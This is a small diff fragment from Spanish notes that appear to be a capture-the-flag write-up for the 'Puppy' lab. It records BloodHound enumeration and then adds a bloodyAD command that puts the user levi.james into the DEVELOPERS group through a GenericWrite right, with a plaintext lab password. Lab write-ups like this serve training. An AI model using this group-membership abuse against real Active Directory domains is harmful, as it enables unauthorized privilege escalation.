@@ -63,7 +63,8 @@ No es susceptible al ataque.
 Recopilar información del LDAP y se guarda en un `.zip` que este le usaremos para subir al blodhound
 Subimos el archivo a bloodhound
 
-
+Añadimos usuario a grupo DEVELOPERS por que tenemos generic write
+`bloodyAD --host $IP -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'`
 
 
 
